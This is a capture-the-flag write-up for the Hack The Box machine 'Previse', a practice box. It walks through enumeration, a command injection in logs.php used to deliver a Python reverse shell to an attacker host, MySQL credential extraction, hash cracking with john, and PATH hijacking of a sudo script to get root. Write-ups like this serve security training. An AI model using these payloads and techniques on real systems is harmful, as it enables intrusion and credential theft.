# [previse](https://app.hackthebox.eu/machines/Previse)

> A Ubuntu Linux box with a web application that allows unauthenticated users to create an account. With access to the web application, a backup of the site's source code is downloadable and reveals and command injection vulnerability. A user's MySQL password is available in the source code and makes it possible to dump password hashes. The `m4lwhere` user's password resides in the `rockyou.txt` word list and thus, can be easily cracked. `m4lwhere` is capable of running a script with administrative privileges that is vulnerable to path injection.

---

## Open Port Discovery

```bash
$ masscan --ports 1..65535 10.10.11.104 --rate=1000 -e tun0 --output-format -   grepable --output-filename previse.masscan
$ cat previse.masscan  | grep open | cut -d' ' -f5 | cut -d'/' -f1 | sort -u | tr '\n' ','
22,80
```

---

## Open Port Enumeration

```bash
$ nmap -sC -sV -O -p22,80 10.10.11.104 -oA previse
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-08 16:12 UTC
Nmap scan report for ip-10-10-11-104.us-east-2.compute.internal (10.10.11.104)
Host is up (0.018s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Previse Login
|_Requested resource was login.php
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.99 seconds
```

OpenSSH string Indicates Ubuntu 18.04.

---

## Web Application Enumeration

### Content Discovery

```bash
$ gobuster dir -u http://10.10.11.104 -w /opt/Seclists/Discovery/Web-Content/raft-small-words.txt -x php
===============================================================                                                                                                                                                    
Gobuster v3.1.0                                                                                                                                                                                                    
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)                                                                                                                                                      
===============================================================                                                                                                                                                    
[+] Url:                     http://10.10.11.104                                                                                                                                                                   
[+] Method:                  GET                                                                                                                                                                                   
[+] Threads:                 10                                                                                                                                                                                    
[+] Wordlist:                /usr/share/wordlists/raft-small-words.txt                                                                                                                                             
[+] Negative Status codes:   404                                                                                                                                                                                   
[+] User Agent:              gobuster/3.1.0                                                                                                                                                                        
[+] Extensions:              php                                                                                                                                                                                   
[+] Timeout:                 10s                                                                                                                                                                                   
===============================================================                                                                                                                                                    
2021/09/08 16:19:39 Starting gobuster in directory enumeration mode                                                                                                                                                
===============================================================                                                                                                                                                    
/.html                (Status: 403) [Size: 277]                                                                                                                                                                    
/.html.php            (Status: 403) [Size: 277]                                                                                                                                                                    
/login.php            (Status: 200) [Size: 2224]                                                                                                                                                                   
/js                   (Status: 301) [Size: 309] [--> http://10.10.11.104/js/]                                                                                                                                      
/index.php            (Status: 302) [Size: 2801] [--> login.php]                                                                                                                                                   
/css                  (Status: 301) [Size: 310] [--> http://10.10.11.104/css/]                                                                                                                                     
/.htm                 (Status: 403) [Size: 277]                                                                                                                                                                    
/.php                 (Status: 403) [Size: 277]                                                                                                                                                                    
/.htm.php             (Status: 403) [Size: 277]                                                                                                                                                                    
/download.php         (Status: 302) [Size: 0] [--> login.php]                                                                                                                                                      
/logout.php           (Status: 302) [Size: 0] [--> login.php]                                                                                                                                                      
/files.php            (Status: 302) [Size: 4914] [--> login.php]                                                                                                                                                   
/logs.php             (Status: 302) [Size: 0] [--> login.php]                                                                                                                                                      
/config.php           (Status: 200) [Size: 0]                                                                                                                                                                      
/header.php           (Status: 200) [Size: 980]                                                                                                                                                                    
/footer.php           (Status: 200) [Size: 217]                                                                                                                                                                    
/.                    (Status: 302) [Size: 2801] [--> login.php]                                                                                                                                                   
/.htaccess            (Status: 403) [Size: 277]                                                                                                                                                                    
/.htaccess.php        (Status: 403) [Size: 277]                                                                                                                                                                    
/accounts.php         (Status: 302) [Size: 3994] [--> login.php]                                                                                                                                                   
/nav.php              (Status: 200) [Size: 1248]                                                                                                                                                                   
/status.php           (Status: 302) [Size: 2968] [--> login.php]                                                                                                                                                   
/.phtml               (Status: 403) [Size: 277]                                                                                                                                                                    
/.htc                 (Status: 403) [Size: 277]                                                                                                                                                                    
/.htc.php             (Status: 403) [Size: 277]                                                                                                                                                                    
/.html_var_DE         (Status: 403) [Size: 277]                                                                                                                                                                    
/.html_var_DE.php     (Status: 403) [Size: 277]                                                                                                                                                                    
/server-status        (Status: 403) [Size: 277]                                                                                                                                                                    
/.htpasswd            (Status: 403) [Size: 277]                                                                                                                                                                    
/.htpasswd.php        (Status: 403) [Size: 277]                                                                                                                                                                    
/.html.               (Status: 403) [Size: 277]                                                                                                                                                                    
/.html..php           (Status: 403) [Size: 277]
/.html..php           (Status: 403) [Size: 277]
/.html.html           (Status: 403) [Size: 277]                                
/.html.html.php       (Status: 403) [Size: 277]                                
/.htpasswds           (Status: 403) [Size: 277]                                
/.htpasswds.php       (Status: 403) [Size: 277]                                
/.htm.                (Status: 403) [Size: 277]                                
/.htm..php            (Status: 403) [Size: 277]                                
/.htmll.php           (Status: 403) [Size: 277]                                
/.htmll               (Status: 403) [Size: 277]                                
/.phps                (Status: 403) [Size: 277]                                
/.html.old            (Status: 403) [Size: 277]                                
/.html.old.php        (Status: 403) [Size: 277]                                
/.ht                  (Status: 403) [Size: 277]                                
/.html.bak            (Status: 403) [Size: 277]                                
/.ht.php              (Status: 403) [Size: 277]                                
/.html.bak.php        (Status: 403) [Size: 277]                                
/.htm.htm             (Status: 403) [Size: 277]                                
/.htm.htm.php         (Status: 403) [Size: 277]                                
/.hta                 (Status: 403) [Size: 277]                                
/.html1               (Status: 403) [Size: 277]                                
/.hta.php             (Status: 403) [Size: 277]                                
/.htgroup             (Status: 403) [Size: 277]                                
/.html1.php           (Status: 403) [Size: 277]                                
/.htgroup.php         (Status: 403) [Size: 277]                                
/.html.printable      (Status: 403) [Size: 277]
/.html.LCK.php        (Status: 403) [Size: 277]                                
/.html.LCK            (Status: 403) [Size: 277]                                
/.html.printable.php  (Status: 403) [Size: 277]                                
/.htm.LCK             (Status: 403) [Size: 277]                                
/.htm.LCK.php         (Status: 403) [Size: 277]                                
/.htaccess.bak.php    (Status: 403) [Size: 277]                                
/.html.php            (Status: 403) [Size: 277]                                
/.htaccess.bak        (Status: 403) [Size: 277]                                
/.htmls               (Status: 403) [Size: 277]                                
/.htx                 (Status: 403) [Size: 277]                                
/.html.php.php        (Status: 403) [Size: 277]                                
/.htmls.php           (Status: 403) [Size: 277]                                
/.htx.php             (Status: 403) [Size: 277]                                
/.htlm                (Status: 403) [Size: 277]                                
/.htm2                (Status: 403) [Size: 277]                                
/.html-.php           (Status: 403) [Size: 277]                                
/.htuser.php          (Status: 403) [Size: 277]                                
/.htlm.php            (Status: 403) [Size: 277]                                
/.htm2.php            (Status: 403) [Size: 277]                                
/.html-               (Status: 403) [Size: 277]                                
/.htuser              (Status: 403) [Size: 277]                                
                                                                               
===============================================================
2021/09/08 16:22:38 Finished
===============================================================
```

Interesting file: `/nav.php`.

### Manual Enumeration

The landing page is a login form: `/login.php`.

![Pasted image 20210908171531](images/Pasted%20image%2020210908171531.png)

`/nav.php` has links to several other paths: `/accounts.php`, `/files.php`, `/status.php`, `file_logs.php`.

![Pasted image 20210908171701](images/Pasted%20image%2020210908171701.png)

Any attempt to follow these links results in a redirect back to `/login.php`. However, the redirect is not simply a 302 with no body. The application actually returns the target page's source in the body of the 302. The target page can be rendered in BurpSuite. For example, `/accounts.php`:

![Pasted image 20210908171944](images/Pasted%20image%2020210908171944.png)

---

## User Account Creation

`/accounts.php` has a user creation form. According to the page, the username and password must be between 5 and 32 characters. Manually submit the form to create a user account.

```http
POST /accounts.php HTTP/1.1
Host: 10.10.11.104
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Connection: close
Referer: http://10.10.11.104/nav.php
Cookie: PHPSESSID=vkpf3itlaa5gupb7fanh5dk7a3
Upgrade-Insecure-Requests: 1
Content-Length: 60

username=tgihf&password=blahblah&confirm=blahblah
```

Log in with the credentials of the newly created user account.

![Pasted image 20210908172357](images/Pasted%20image%2020210908172357.png)

---

## User Account Exploitation

### Backup Site Archive

![[Pasted image 20210909161556.png]]

### Command Injection

Reading through the source code files from the site backup, `logs.php`'s `delim` parameter is vulnerable to operating system command injection.

The source code:

```php
<?php
session_start();
if (!isset($_SESSION['user'])) {
    header('Location: login.php');
    exit;
}
?>

<?php
if (!$_SERVER['REQUEST_METHOD'] == 'POST') {
    header('Location: login.php');
    exit;
}

/////////////////////////////////////////////////////////////////////////////////////
//I tried really hard to parse the log delims in PHP, but python was SO MUCH EASIER//
/////////////////////////////////////////////////////////////////////////////////////

$output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");
echo $output;

$filepath = "/var/www/out.log";
$filename = "out.log";    

if(file_exists($filepath)) {
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($filepath).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($filepath));
    ob_clean(); // Discard data in the output buffer
    flush(); // Flush system headers
    readfile($filepath);
    die();
} else {
    http_response_code(404);
    die();
} 
?>
```

This request initiates a reverse shell on the target.

```http
POST /logs.php HTTP/1.1
Host: 10.10.11.104
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://10.10.11.104/index.php
Cookie: PHPSESSID=d9978iidgdiqa5jl9upflure6d
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 267

delim=comma;python%20-c%20'import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.10.14.194%22,443));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call(%5B%22/bin/sh%22,%22-i%22%5D);'
```

Catching the reverse shell.

```bash
$ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.194] from (UNKNOWN) [10.10.11.104] 51124
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```


### MySQL Credentials

`/accounts.php`

```php
<?php

function connectDB(){
    $host = 'localhost';
    $user = 'root';
    $passwd = 'mySQL_p@ssw0rd!:)';
    $db = 'previse';
    $mycon = new mysqli($host, $user, $passwd, $db);
    return $mycon;
}

?>
```

### Dumping Hashes from MySQL Table

```bash
$ mysql -u root -p
mysql -u root -p
Enter password: mySQL_p@ssw0rd!:)

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 9
Server version: 5.7.35-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> select * from previse.accounts;
select * from previse.accounts;
+----+----------+------------------------------------+---------------------+
| id | username | password                           | created_at          |
+----+----------+------------------------------------+---------------------+
|  1 | m4lwhere | $1$[salt emoji]llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |
|  2 | tgihf    | $1$[salt emoji]llol$pOEH0AbYC8AC95DBTzxXH. | 2021-09-10 18:15:28 |
+----+----------+------------------------------------+---------------------+
```

### Cracking `m4lwhere`'s Hash

`john` recommended the `--format=md5crypt-long` flag.

```bash
$ echo '$1$[salt emoji]llol$DQpmdvnb7EeuO6UaqRItf.' > m4lwhere-hash.txt
$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-long m4lwhere-hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt-long, crypt(3) $1$ (and variants) [MD5 32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovecody112235! (?)
1g 0:00:10:22 DONE (2021-09-10 18:32) 0.001605g/s 11905p/s 11905c/s 11905C/s ilovecody31..ilovecody..
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

`m4lwhere`'s password is `ilovecody112235!`.

---

## Privilege Escalation

Login via SSH using `m4lwhere`'s credentials.

```bash
$ ssh m4lwhere@10.10.11.104
m4lwhere@10.10.11.104's password: ilovecody112235!
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-151-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Sep 10 18:37:13 UTC 2021

  System load:  0.02              Processes:           181
  Usage of /:   49.5% of 4.85GB   Users logged in:     0
  Memory usage: 21%               IP address for eth0: 10.10.11.104
  Swap usage:   0%


0 updates can be applied immediately.


Last login: Fri Jun 18 01:09:10 2021 from 10.10.10.5
m4lwhere@previse:~$
```

### Enumeration

Check which commands `m4lwhere` can run with elevated permissions via `sudo`.

```bash
$ sudo -l
[sudo] password for m4lwhere: ilovecody112235!
User m4lwhere may run the following commands on previse:
    (root) /opt/scripts/access_backup.sh
```

`/opt/scripts/access_backup.sh`:

```bash
#!/bin/bash

# We always make sure to store logs, we take security SERIOUSLY here

# I know I shouldnt run this as root but I cant figure it out programmatically on my account
# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time

gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz
```

### Exploitation

`m4lwhere` can run `access_backup.sh` as `root`. `access_backup.sh` runs `date` without a full path. It is possible to execute arbitary commands as `root` by (1) creating a script with the commands to run named `date` and (2) prepending the full path of the directory containing the new `date` script to the front of the `$PATH` environment variable. When `access_backup.sh` is executed, it will find the custom `date` script before the legitimate `date` command and executed it with elevated privileges.

```bash
$ mkdir /dev/shm/tgihf
$ echo '#!/bin/bash' > /dev/shm/tgihf/date
$ echo 'cat /root/root.txt > /dev/shm/tgihf/root.txt' >> /dev/shm/tgihf/date
$ chmod +x /dev/shm/date
$ PATH=/dev/shm/tgihf:$PATH
$ sudo /opt/scripts/access_backup.sh
```

Read `/dev/shm/tgihf/root.txt` to obtain the system flag.
